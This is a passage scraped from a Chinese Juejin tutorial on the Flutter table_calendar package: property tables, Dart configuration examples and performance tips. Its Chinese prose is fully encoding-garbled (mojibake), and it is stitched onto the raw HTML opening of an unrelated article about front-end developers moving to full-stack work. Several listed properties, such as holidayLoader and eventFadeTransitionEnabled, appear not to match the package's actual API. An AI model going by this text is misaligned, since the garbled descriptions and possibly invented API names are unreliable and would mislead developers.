
<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>eventLoader</code></td><td><code>List&lt;Object&gt; Function(DateTime)</code></td><td>åŠ è½½æŒ‡å®šæ—¥æœŸçš„äº‹ä»¶æ•°æ®</td></tr><tr><td><code>calendarBuilders</code></td><td><code>CalendarBuilders</code></td><td>è‡ªå®šä¹‰æ—¥å†å…ƒç´ æ„å»ºå™¨ï¼ˆæ ‡è®°/æ—¥æœŸç­‰ï¼‰</td></tr><tr><td><code>holidayLoader</code></td><td><code>List&lt;Object&gt; Function(DateTime)</code></td><td>åŠ è½½æŒ‡å®šæ—¥æœŸçš„å‡æ—¥æ•°æ®</td></tr><tr><td><code>eventFadeTransitionEnabled</code></td><td><code>bool</code></td><td>äº‹ä»¶æ ‡è®°æ˜¯å¦å¯ç”¨æ·¡å…¥åŠ¨ç”»ï¼ˆé»˜è®¤trueï¼‰</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å®šä¹‰äº‹ä»¶æ•°æ®ç»“æ„</span>
<span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">DateTime</span>, <span class="hljs-built_in">List</span>&gt; _events = {
  <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2023</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>): [<span class="hljs-string">'ä¼šè®®'</span>, <span class="hljs-string">'ç”Ÿæ—¥'</span>],
  <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2023</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>): [<span class="hljs-string">'deadline'</span>],
};

TableCalendar(
  <span class="hljs-comment">// ...å…¶ä»–å‚æ•°</span>
  eventLoader: (day) {
    <span class="hljs-keyword">return</span> _events[day] ?? [];
  },
  calendarBuilders: CalendarBuilders(
    markerBuilder: (context, date, events) {
      <span class="hljs-keyword">if</span> (events.isEmpty) <span class="hljs-keyword">return</span> SizedBox();
      <span class="hljs-keyword">return</span> Positioned(
        bottom: <span class="hljs-number">1</span>,
        child: Container(
          width: <span class="hljs-number">16</span>,
          height: <span class="hljs-number">4</span>,
          decoration: BoxDecoration(
            color: Colors.blue,
            borderRadius: BorderRadius.circular(<span class="hljs-number">2</span>),
          ),
        ),
      );
    },
  ),
)
</code></pre>
<h3 data-id="heading-9">3.5. æ ·å¼å®šåˆ¶å±æ€§</h3>


















































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>calendarStyle</code></td><td><code>CalendarStyle</code></td><td>æ—¥å†ä¸»ä½“æ ·å¼é…ç½®</td></tr><tr><td><code>headerStyle</code></td><td><code>HeaderStyle</code></td><td>è¡¨å¤´ï¼ˆæœˆä»½æ ï¼‰æ ·å¼é…ç½®</td></tr><tr><td><code>daysOfWeekStyle</code></td><td><code>DaysOfWeekStyle</code></td><td>æ˜ŸæœŸæ ‡é¢˜æ ·å¼é…ç½®</td></tr><tr><td><code>rowHeight</code></td><td><code>double</code></td><td>æ—¥å†è¡Œé«˜ï¼ˆå½±å“æ•´ä½“é«˜åº¦ï¼‰</td></tr><tr><td><code>columnWidth</code></td><td><code>double?</code></td><td>æ—¥å†åˆ—å®½ï¼ˆnullæ—¶è‡ªåŠ¨è®¡ç®—ï¼‰</td></tr><tr><td><code>padding</code></td><td><code>EdgeInsets</code></td><td>æ—¥å†å†…è¾¹è·</td></tr><tr><td><code>margin</code></td><td><code>EdgeInsets</code></td><td>æ—¥å†å¤–è¾¹è·</td></tr><tr><td><code>clipBehavior</code></td><td><code>Clip</code></td><td>è£å‰ªè¡Œä¸ºï¼ˆé»˜è®¤Clip.hardEdgeï¼‰</td></tr></tbody></table>
<h4 data-id="heading-10">CalendarStyle å­å±æ€§</h4>



















































































































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>defaultTextStyle</code></td><td><code>TextStyle</code></td><td>é»˜è®¤æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>selectedTextStyle</code></td><td><code>TextStyle</code></td><td>é€‰ä¸­æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>todayTextStyle</code></td><td><code>TextStyle</code></td><td>ä»Šå¤©æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>weekendTextStyle</code></td><td><code>TextStyle</code></td><td>å‘¨æœ«æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>outsideTextStyle</code></td><td><code>TextStyle</code></td><td>æ˜¾ç¤ºèŒƒå›´å¤–æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>disabledTextStyle</code></td><td><code>TextStyle</code></td><td>ç¦ç”¨æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>selectedDecoration</code></td><td><code>Decoration</code></td><td>é€‰ä¸­æ—¥æœŸè£…é¥°ï¼ˆèƒŒæ™¯ç­‰ï¼‰</td></tr><tr><td><code>todayDecoration</code></td><td><code>Decoration</code></td><td>ä»Šå¤©æ—¥æœŸè£…é¥°</td></tr><tr><td><code>defaultDecoration</code></td><td><code>Decoration</code></td><td>é»˜è®¤æ—¥æœŸè£…é¥°</td></tr><tr><td><code>weekendDecoration</code></td><td><code>Decoration</code></td><td>å‘¨æœ«æ—¥æœŸè£…é¥°</td></tr><tr><td><code>outsideDecoration</code></td><td><code>Decoration</code></td><td>èŒƒå›´å¤–æ—¥æœŸè£…é¥°</td></tr><tr><td><code>disabledDecoration</code></td><td><code>Decoration</code></td><td>ç¦ç”¨æ—¥æœŸè£…é¥°</td></tr><tr><td><code>rangeStartDecoration</code></td><td><code>Decoration</code></td><td>èŒƒå›´é€‰æ‹©èµ·å§‹æ—¥æœŸè£…é¥°</td></tr><tr><td><code>rangeEndDecoration</code></td><td><code>Decoration</code></td><td>èŒƒå›´é€‰æ‹©ç»“æŸæ—¥æœŸè£…é¥°</td></tr><tr><td><code>rangeMiddleDecoration</code></td><td><code>Decoration</code></td><td>èŒƒå›´é€‰æ‹©ä¸­é—´æ—¥æœŸè£…é¥°</td></tr><tr><td><code>markersDecoration</code></td><td><code>Decoration</code></td><td>äº‹ä»¶æ ‡è®°å®¹å™¨è£…é¥°</td></tr><tr><td><code>markersMaxCount</code></td><td><code>int</code></td><td>æœ€å¤šæ˜¾ç¤ºçš„äº‹ä»¶æ ‡è®°æ•°é‡</td></tr><tr><td><code>markerSize</code></td><td><code>double</code></td><td>äº‹ä»¶æ ‡è®°å¤§å°</td></tr><tr><td><code>markersOffset</code></td><td><code>PositionedOffset</code></td><td>äº‹ä»¶æ ‡è®°åç§»é‡</td></tr><tr><td><code>canMarkersOverflow</code></td><td><code>bool</code></td><td>æ ‡è®°æ˜¯å¦å…è®¸æº¢å‡ºæ—¥æœŸå•å…ƒæ ¼</td></tr><tr><td><code>outsideDaysVisible</code></td><td><code>bool</code></td><td>æ˜¯å¦æ˜¾ç¤ºèŒƒå›´å¤–çš„æ—¥æœŸï¼ˆé»˜è®¤trueï¼‰</td></tr></tbody></table>
<h4 data-id="heading-11">HeaderStyle å­å±æ€§</h4>











































































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>formatButtonVisible</code></td><td><code>bool</code></td><td>æ˜¯å¦æ˜¾ç¤ºè§†å›¾åˆ‡æ¢æŒ‰é’®ï¼ˆé»˜è®¤trueï¼‰</td></tr><tr><td><code>formatButtonShowsNext</code></td><td><code>bool</code></td><td>åˆ‡æ¢æŒ‰é’®æ˜¯å¦æ˜¾ç¤ºä¸‹ä¸€ä¸ªæ ¼å¼ï¼ˆé»˜è®¤trueï¼‰</td></tr><tr><td><code>formatButtonDecoration</code></td><td><code>BoxDecoration</code></td><td>è§†å›¾åˆ‡æ¢æŒ‰é’®è£…é¥°</td></tr><tr><td><code>formatButtonTextStyle</code></td><td><code>TextStyle</code></td><td>è§†å›¾åˆ‡æ¢æŒ‰é’®æ–‡æœ¬æ ·å¼</td></tr><tr><td><code>leftChevronIcon</code></td><td><code>Widget</code></td><td>å·¦ç®­å¤´å›¾æ ‡</td></tr><tr><td><code>rightChevronIcon</code></td><td><code>Widget</code></td><td>å³ç®­å¤´å›¾æ ‡</td></tr><tr><td><code>titleTextStyle</code></td><td><code>TextStyle</code></td><td>æ ‡é¢˜ï¼ˆæœˆä»½ï¼‰æ–‡æœ¬æ ·å¼</td></tr><tr><td><code>titleCentered</code></td><td><code>bool</code></td><td>æ ‡é¢˜æ˜¯å¦å±…ä¸­ï¼ˆé»˜è®¤falseï¼‰</td></tr><tr><td><code>titleFormatter</code></td><td><code>String Function(DateTime, dynamic)</code></td><td>æ ‡é¢˜æ–‡æœ¬æ ¼å¼åŒ–å™¨</td></tr><tr><td><code>headerPadding</code></td><td><code>EdgeInsets</code></td><td>è¡¨å¤´å†…è¾¹è·</td></tr><tr><td><code>headerMargin</code></td><td><code>EdgeInsets</code></td><td>è¡¨å¤´å¤–è¾¹è·</td></tr><tr><td><code>chevronPadding</code></td><td><code>EdgeInsets</code></td><td>ç®­å¤´å›¾æ ‡å†…è¾¹è·</td></tr><tr><td><code>chevronVisible</code></td><td><code>bool</code></td><td>æ˜¯å¦æ˜¾ç¤ºç®­å¤´å›¾æ ‡ï¼ˆé»˜è®¤trueï¼‰</td></tr></tbody></table>
<p>æ ·å¼å®šåˆ¶ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">TableCalendar(
  <span class="hljs-comment">// ...å…¶ä»–å‚æ•°</span>
  calendarStyle: CalendarStyle(
    <span class="hljs-comment">// é€‰ä¸­æ—¥æœŸæ ·å¼</span>
    selectedDecoration: BoxDecoration(
      color: Colors.blue,
      shape: BoxShape.circle,
    ),
    <span class="hljs-comment">// ä»Šå¤©æ—¥æœŸæ ·å¼</span>
    todayDecoration: BoxDecoration(
      color: Colors.grey[<span class="hljs-number">200</span>],
      shape: BoxShape.circle,
    ),
    <span class="hljs-comment">// å‘¨æœ«æ ·å¼</span>
    weekendTextStyle: TextStyle(color: Colors.red),
    <span class="hljs-comment">// äº‹ä»¶æ ‡è®°æ ·å¼</span>
    markersMaxCount: <span class="hljs-number">3</span>,  <span class="hljs-comment">// æœ€å¤šæ˜¾ç¤º3ä¸ªæ ‡è®°</span>
    markerSize: <span class="hljs-number">6</span>,
  ),
  <span class="hljs-comment">// è¡¨å¤´æ ·å¼</span>
  headerStyle: HeaderStyle(
    formatButtonVisible: <span class="hljs-keyword">false</span>,  <span class="hljs-comment">// éšè—è§†å›¾åˆ‡æ¢æŒ‰é’®</span>
    titleCentered: <span class="hljs-keyword">true</span>,
    headerPadding: EdgeInsets.symmetric(vertical: <span class="hljs-number">8</span>),
    titleTextStyle: TextStyle(fontSize: <span class="hljs-number">18</span>, fontWeight: FontWeight.bold),
  ),
)
</code></pre>
<h3 data-id="heading-12">3.6. æœ¬åœ°åŒ–å±æ€§</h3>






























<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>locale</code></td><td><code>String?</code></td><td>æœ¬åœ°åŒ–è¯­è¨€ä»£ç ï¼ˆå¦‚'zh_CN'ã€'en_US'ï¼‰</td></tr><tr><td><code>daysOfWeekLabels</code></td><td><code>List&lt;String&gt;</code></td><td>æ˜ŸæœŸæ ‡ç­¾æ–‡æœ¬ï¼ˆé»˜è®¤æŒ‰localeç”Ÿæˆï¼‰</td></tr><tr><td><code>daysOfWeekLabelsExceptions</code></td><td><code>Map&lt;int, String&gt;</code></td><td>ç‰¹å®šæ˜ŸæœŸå‡ çš„æ–‡æœ¬è¦†ç›–</td></tr><tr><td><code>weekNumberLabel</code></td><td><code>String</code></td><td>å‘¨æ•°æ ‡ç­¾æ–‡æœ¬ï¼ˆé»˜è®¤'W'ï¼‰</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:intl/intl.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:intl/date_symbol_data_local.dart'</span>;

<span class="hljs-comment">// åˆå§‹åŒ–æœ¬åœ°åŒ–</span>
initializeDateFormatting().then((_) {
  setState(() {});
});

TableCalendar(
  <span class="hljs-comment">// ...å…¶ä»–å‚æ•°</span>
  locale: <span class="hljs-string">'zh_CN'</span>,  <span class="hljs-comment">// æ”¯æŒ 'en_US', 'ja_JP' ç­‰</span>
  daysOfWeekStyle: DaysOfWeekStyle(
    weekdayStyle: TextStyle(),
    weekendStyle: TextStyle(color: Colors.red),
  ),
)
</code></pre>
<h3 data-id="heading-13">3.7. äº¤äº’æ§åˆ¶å±æ€§</h3>



































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>enabledDayPredicate</code></td><td><code>bool Function(DateTime)</code></td><td>åˆ¤æ–­æ—¥æœŸæ˜¯å¦å¯äº¤äº’ï¼ˆé»˜è®¤å…¨éƒ¨å¯äº¤äº’ï¼‰</td></tr><tr><td><code>onHeaderTapped</code></td><td><code>void Function(DateTime)</code></td><td>è¡¨å¤´ç‚¹å‡»å›è°ƒ</td></tr><tr><td><code>onHeaderLongPressed</code></td><td><code>void Function(DateTime)</code></td><td>è¡¨å¤´é•¿æŒ‰å›è°ƒ</td></tr><tr><td><code>onDayLongPressed</code></td><td><code>void Function(DateTime, DateTime)</code></td><td>æ—¥æœŸé•¿æŒ‰å›è°ƒ</td></tr><tr><td><code>dragStartBehavior</code></td><td><code>DragStartBehavior</code></td><td>æ‹–æ‹½èµ·å§‹è¡Œä¸ºï¼ˆé»˜è®¤startï¼‰</td></tr></tbody></table>
<h3 data-id="heading-14">3.8. é«˜çº§è‡ªå®šä¹‰å±æ€§</h3>













































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>calendarBuilders</code></td><td><code>CalendarBuilders</code></td><td>è‡ªå®šä¹‰æ„å»ºå™¨é›†åˆï¼ˆä»¥ä¸‹ä¸ºå¸¸ç”¨å­é¡¹ï¼‰</td></tr><tr><td>- <code>dayBuilder</code></td><td><code>Widget Function(BuildContext, DateTime, DateTime, bool, bool, bool, bool, List)</code></td><td>è‡ªå®šä¹‰æ—¥æœŸå•å…ƒæ ¼</td></tr><tr><td>- <code>markerBuilder</code></td><td><code>Widget Function(BuildContext, DateTime, List)</code></td><td>è‡ªå®šä¹‰äº‹ä»¶æ ‡è®°</td></tr><tr><td>- <code>headerTitleBuilder</code></td><td><code>Widget Function(BuildContext, DateTime)</code></td><td>è‡ªå®šä¹‰è¡¨å¤´æ ‡é¢˜</td></tr><tr><td>- <code>weekNumberBuilder</code></td><td><code>Widget Function(BuildContext, int)</code></td><td>è‡ªå®šä¹‰å‘¨æ•°æ˜¾ç¤º</td></tr><tr><td><code>transitionDuration</code></td><td><code>Duration</code></td><td>è§†å›¾åˆ‡æ¢åŠ¨ç”»æ—¶é•¿ï¼ˆé»˜è®¤200msï¼‰</td></tr><tr><td><code>pageAnimationEnabled</code></td><td><code>bool</code></td><td>æ˜¯å¦å¯ç”¨é¡µé¢åˆ‡æ¢åŠ¨ç”»ï¼ˆé»˜è®¤trueï¼‰</td></tr></tbody></table>
<h2 data-id="heading-15">4. æ€§èƒ½ä¼˜åŒ–</h2>
<ul>
<li>ä½¿ç”¨ <code>ValueNotifier</code> ç®¡ç†äº‹ä»¶æ•°æ®ï¼Œé¿å…ä¸å¿…è¦é‡å»º</li>
<li>å¤æ‚æ ‡è®°ä½¿ç”¨ç¼“å­˜Widget</li>
<li>åˆç†è®¾ç½® <code>firstDay</code> å’Œ <code>lastDay</code> èŒƒå›´</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> ValueNotifier&lt;<span class="hljs-built_in">List</span>&gt; _selectedEvents = ValueNotifier([]);

<span class="hljs-comment">// ç›‘å¬é€‰ä¸­æ—¥æœŸå˜åŒ–æ›´æ–°äº‹ä»¶</span>
<span class="hljs-keyword">void</span> _updateSelectedEvents() {
  _selectedEvents.value = _events[_selectedDay] ?? [];
}

<span class="hljs-comment">// æ„å»ºæ—¶ä½¿ç”¨ValueListenableBuilder</span>
ValueListenableBuilder&lt;<span class="hljs-built_in">List</span>&gt;(
  valueListenable: _selectedEvents,
  builder: (context, value, _) {
    <span class="hljs-keyword">return</span> <span class="hljs-comment">// äº‹ä»¶åˆ—è¡¨</span>
  },
)
</code></pre>
<h2 data-id="heading-16">5. å®Œæ•´é…ç½®ç¤ºä¾‹</h2>
<pre><code class="hljs language-dart" lang="dart">TableCalendar(
  firstDay: <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2020</span>),
  lastDay: <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2030</span>),
  focusedDay: _focusedDay,
  selectedDayPredicate: (day) =&gt; isSameDay(_selectedDay, day),
  onDaySelected: (selectedDay, focusedDay) {
    <span class="hljs-keyword">if</span> (!isSameDay(_selectedDay, selectedDay)) {
      setState(() {
        _selectedDay = selectedDay;
        _focusedDay = focusedDay;
      });
    }
  },
  <span class="hljs-comment">// è§†å›¾é…ç½®</span>
  calendarFormat: _calendarFormat,
  onFormatChanged: (format) =&gt; setState(() =&gt; _calendarFormat = format),
  availableCalendarFormats: <span class="hljs-keyword">const</span> {
    CalendarFormat.month: <span class="hljs-string">'æœˆ'</span>,
    CalendarFormat.week: <span class="hljs-string">'å‘¨'</span>,
  },
  <span class="hljs-comment">// èŒƒå›´é€‰æ‹©</span>
  rangeStartDay: _rangeStart,
  rangeEndDay: _rangeEnd,
  rangeSelectionMode: _rangeSelectionMode,
  onRangeSelected: (start, end, focusedDay) =&gt; setState(() {
    _rangeStart = start;
    _rangeEnd = end;
    _rangeSelectionMode = RangeSelectionMode.toggledOn;
  }),
  <span class="hljs-comment">// äº‹ä»¶åŠ è½½</span>
  eventLoader: (day) =&gt; _events[day] ?? [],
  <span class="hljs-comment">// æ ·å¼å®šåˆ¶</span>
  calendarStyle: CalendarStyle(
    selectedDecoration: <span class="hljs-keyword">const</span> BoxDecoration(
      color: Colors.blue,
      shape: BoxShape.circle,
    ),
    todayDecoration: BoxDecoration(
      color: Colors.grey[<span class="hljs-number">200</span>],
      shape: BoxShape.circle,
    ),
    markersMaxCount: <span class="hljs-number">3</span>,
  ),
  headerStyle: <span class="hljs-keyword">const</span> HeaderStyle(
    titleCentered: <span class="hljs-keyword">true</span>,
    formatButtonVisible: <span class="hljs-keyword">false</span>,
  ),
  <span class="hljs-comment">// æœ¬åœ°åŒ–</span>
  locale: <span class="hljs-string">'zh_CN'</span>,
  <span class="hljs-comment">// è‡ªå®šä¹‰æ„å»ºå™¨</span>
  calendarBuilders: CalendarBuilders(
    markerBuilder: (context, date, events) =&gt; events.isNotEmpty
        ? Container(
            width: <span class="hljs-number">12</span>,
            height: <span class="hljs-number">12</span>,
            decoration: <span class="hljs-keyword">const</span> BoxDecoration(
              color: Colors.red,
              shape: BoxShape.circle,
            ),
          )
        : <span class="hljs-keyword">null</span>,
  ),
)
</code></pre>
<h2 data-id="heading-17">6. æ€»ç»“</h2>
<p><code>table_calendar</code> æä¾›äº†çµæ´»çš„æ—¥å†è§£å†³æ–¹æ¡ˆï¼Œæ ¸å¿ƒå…³æ³¨ï¼š</p>
<ul>
<li>åŸºç¡€æ—¥æœŸé€‰æ‹©ä¸èŒƒå›´é€‰æ‹©çš„çŠ¶æ€ç®¡ç†</li>
<li>äº‹ä»¶æ ‡è®°ä¸è‡ªå®šä¹‰æ ·å¼çš„è§†è§‰å®šåˆ¶</li>
<li>è§†å›¾åˆ‡æ¢ä¸æœ¬åœ°åŒ–çš„ç”¨æˆ·ä½“éªŒä¼˜åŒ–</li>
<li>æ€§èƒ½ä¼˜åŒ–æŠ€å·§ï¼ˆå¦‚çŠ¶æ€éš”ç¦»ã€åˆç†è®¾ç½®èŒƒå›´ï¼‰</li>
</ul>
<p>æ›´å¤æ‚åŠŸèƒ½å¯å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fpub.dev%2Fpackages%2Ftable_calendar" target="_blank" title="https://pub.dev/packages/table_calendar" ref="nofollow noopener noreferrer">å®˜æ–¹æ–‡æ¡£</a>æˆ–<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faleksanderwozniak%2Ftable_calendar" target="_blank" title="https://github.com/aleksanderwozniak/table_calendar" ref="nofollow noopener noreferrer">Githubä»“åº“</a>å®ç°ã€‚ä½¿ç”¨æ—¶éœ€æ³¨æ„èŒƒå›´é€‰æ‹©ä¸å•ä¸ªé€‰æ‹©çš„äº’æ–¥æ€§ï¼Œä»¥åŠæœ¬åœ°åŒ–é…ç½®çš„åˆå§‹åŒ–æ­¥éª¤ã€‚</p>
<hr/>
<blockquote>
<p>æœ¬æ¬¡åˆ†äº«å°±åˆ°è¿™å„¿å•¦ï¼Œæˆ‘æ˜¯é¹å¤šå¤šï¼Œæ·±è€•å‰ç«¯çš„æŠ€æœ¯åˆ›ä½œè€…ï¼Œå¦‚æœæ‚¨çœ‹äº†è§‰å¾—æœ‰å¸®åŠ©ï¼Œæ¬¢è¿è¯„è®ºï¼Œå…³æ³¨ï¼Œç‚¹èµï¼Œè½¬å‘ï¼Œæˆ‘ä»¬ä¸‹æ¬¡è§~</p>
</blockquote>
<p>PSï¼šåœ¨æœ¬é¡µæŒ‰F12ï¼Œåœ¨consoleä¸­è¾“å…¥document.getElementsByClassName('panel-btn')[0].click();æœ‰æƒŠå–œå“¦~</p>
<p><code>å¾€æœŸæ–‡ç« </code></p>
<ul>
<li><a href="https://juejin.cn/post/7580389111921786943" target="_blank" title="https://juejin.cn/post/7580389111921786943">flutter-å±å¹•è‡ªé€‚åº”æ’ä»¶flutter_screenutilæ•™ç¨‹å…¨æŒ‡å—</a></li>
<li><a href="https://juejin.cn/post/7579101504289882166" target="_blank" title="https://juejin.cn/post/7579101504289882166">flutter-ä½¿ç”¨url_launcheræ‰“å¼€é“¾æ¥/åº”ç”¨/çŸ­ä¿¡/é‚®ä»¶å’Œè¯„åˆ†è·³è½¬ç­‰</a></li>
<li><a href="https://juejin.cn/post/7570923924365230143" target="_blank" title="https://juejin.cn/post/7570923924365230143">flutterå›¾ç‰‡é€‰æ‹©åº“multi_image_picker_pluså’Œimage_pickerçš„å¯¹æ¯”å’Œä½¿ç”¨è§£æ</a></li>
<li><a href="https://juejin.cn/post/7568136081302978623" target="_blank" title="https://juejin.cn/post/7568136081302978623">è§£é”flutterå¼¹çª—æ–°å§¿åŠ¿ï¼šdialog-flutter_smart_dialogæ’ä»¶è§£è¯»+æ¡ˆä¾‹</a></li>
<li><a href="https://juejin.cn/post/7559089440901545999" target="_blank" title="https://juejin.cn/post/7559089440901545999">flutter-åˆ‡æ¢çŠ¶æ€æ˜¾ç¤ºä¸åŒç»„ä»¶10ç§å®ç°æ–¹æ¡ˆå…¨è§£æ</a></li>
<li><a href="https://juejin.cn/post/7555079970491318308" target="_blank" title="https://juejin.cn/post/7555079970491318308">flutter-è¯¦è§£æ§åˆ¶ç»„ä»¶æ˜¾ç¤ºçš„ä¸¤ç§æ–¹å¼Offstageä¸Visibility</a></li>
<li><a href="https://juejin.cn/post/7535358416182788122" target="_blank" title="https://juejin.cn/post/7535358416182788122">flutter-ä½¿ç”¨AnimatedDefaultTextStyleå®ç°æ–‡æœ¬åŠ¨ç”»</a></li>
<li><a href="https://juejin.cn/post/7537339432291434496" target="_blank" title="https://juejin.cn/post/7537339432291434496">flutter-ä½¿ç”¨SafeAreaç»„ä»¶å¤„ç†å„æœºå‹çš„å®‰å…¨è·ç¦»</a></li>
<li><a href="https://juejin.cn/spost/7537593417099149321" target="_blank" title="https://juejin.cn/spost/7537593417099149321">flutter-å®ç°æ¸å˜è‰²è¾¹æ¡†èƒŒæ™¯ä»¥åŠæ¸å˜è‰²æ–‡å­—</a></li>
<li><a href="https://juejin.cn/post/7543474419240370185" target="_blank" title="https://juejin.cn/post/7543474419240370185">flutter-ä½¿ç”¨confettiåˆ¶ä½œç‚«é…·çº¸å±‘çˆ†ç‚¸ç²’å­åŠ¨ç”»</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»ç¾å›¢å…¨æ ˆåŒ–çœ‹ AI å†²å‡»ï¼šå‰ç«¯è½¬å…¨æ ˆï¼Œæ˜¯è‡ªæ•‘è¿˜æ˜¯å¿…ç„¶ ğŸ¤”ğŸ¤”ğŸ¤”]]></title>    <link>https://juejin.cn/post/7581999251368460340</link>    <guid>https://juejin.cn/post/7581999251368460340</guid>    <pubDate>2025-12-10T14:30:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581999251368460340" data-draft-id="7582036070159745024" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»ç¾å›¢å…¨æ ˆåŒ–çœ‹ AI å†²å‡»ï¼šå‰ç«¯è½¬å…¨æ ˆï¼Œæ˜¯è‡ªæ•‘è¿˜æ˜¯å¿…ç„¶ ğŸ¤”ğŸ¤”ğŸ¤”"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-10T14:30:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»ç¾å›¢å…¨æ ˆåŒ–çœ‹ AI å†²å‡»ï¼šå‰ç«¯è½¬å…¨æ ˆï¼Œæ˜¯è‡ªæ•‘è¿˜æ˜¯å¿…ç„¶ ğŸ¤”ğŸ¤”ğŸ¤”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T14:30:11.000Z" title="Wed Dec 10 2025 14:30:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color 